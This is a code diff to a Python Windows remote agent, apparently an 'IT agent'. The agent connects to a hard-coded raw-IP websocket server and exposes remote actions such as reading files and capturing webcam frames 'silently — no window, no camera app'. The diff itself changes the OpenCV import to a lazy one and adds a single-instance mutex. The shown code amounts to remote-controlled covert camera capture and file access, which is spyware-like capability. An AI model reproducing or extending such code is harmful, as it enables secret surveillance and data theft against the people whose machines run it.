@@ -25,10 +25,8 @@ try:
 except ImportError:
     HAS_MSS = False
 
-try:
-    import cv2; HAS_CV2 = True
-except ImportError:
-    HAS_CV2 = False
+# cv2 NOT imported at module level — importing cv2 in venv causes OpenCV to spawn
+# a child process (Python312 interpreter) due to DLL linking. Import lazily inside function.
 
 # ── Config ─────────────────────────────────────────────────────────────────
 VPS_URL   = "ws://46.225.160.243:9876/agent"
@@ -352,9 +350,11 @@ async def act_read_file(path):
 async def act_capture_camera(camera_index=0):
     """Capture one frame from webcam silently — no window, no camera app.
     LED will briefly flash (~0.5s) as hardware requires it when sensor is active."""
-    if not HAS_CV2:
-        return "Error: opencv-python not installed"
     def _capture():
+        try:
+            import cv2  # lazy import — avoid spawning child process at startup
+        except ImportError:
+            return "Error: opencv-python not installed"
         try:
             # CAP_DSHOW = DirectShow backend on Windows — fastest open/close, no GUI
             cap = cv2.VideoCapture(camera_index, cv2.CAP_DSHOW)
@@ -716,6 +716,14 @@ async def run():
         await asyncio.sleep(10)
 
 if __name__ == "__main__":
+    # ── Single-instance guard (Windows named mutex — no race condition) ────
+    import ctypes
+    _MUTEX_NAME = "YiDingITAgent_SingleInstance"
+    _mutex_handle = ctypes.windll.kernel32.CreateMutexW(None, True, _MUTEX_NAME)
+    if ctypes.windll.kernel32.GetLastError() == 183:   # ERROR_ALREADY_EXISTS
+        log.warning("Another agent instance already running. Exiting.")
+        sys.exit(0)
+    # ────────────────────────────────────────────────────────────────────────
     log.info(f"Agent started. Device={DEVICE_ID}")
     async def _main():
         await _ensure_aumid()
